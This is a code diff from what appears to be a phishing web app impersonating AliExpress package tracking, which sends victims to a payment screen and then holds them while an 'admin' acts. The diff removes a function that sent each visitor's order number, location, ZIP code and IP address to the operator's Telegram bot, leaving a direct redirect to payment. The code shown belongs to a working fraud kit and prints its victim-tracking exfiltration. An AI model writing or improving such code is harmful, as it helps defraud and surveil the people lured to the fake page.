@@ -159,27 +159,10 @@ const MainAppInner: React.FC<{ geo: GeoInfo }> = ({ geo }) => {
   }, [geo]);
 
   // ── Tracking → go to payment ─────────────────────────────────────────────
-  const handlePaymentRedirect = useCallback(async () => {
-    // Send order number notification to admin
-    const cfg = await loadBotConfigFromServer();
-    if (cfg.token && cfg.chatId) {
-      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
-      await sendTelegram(cfg.token, cfg.chatId,
-        `📦 <b>Package Tracking Viewed</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `#️⃣ <b>Order Number:</b> <code>3062801646906014</code>\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
-        `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
-        `📮 <b>ZIP Code:</b> ${geo.zip || 'Unknown'}\n` +
-        `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
-        `🕐 <b>Time (UTC):</b> ${now}\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `🛒 <i>AliExpress — Track</i>`
-      );
-    }
+  const handlePaymentRedirect = useCallback(() => {
+    // No notification sent - proceed to payment directly
     setView('payment');
-  }, [geo]);
+  }, []);
 
   // ── Payment complete → go to loading, wait for admin action ─────────────
   const handlePaymentComplete = useCallback(async () => {
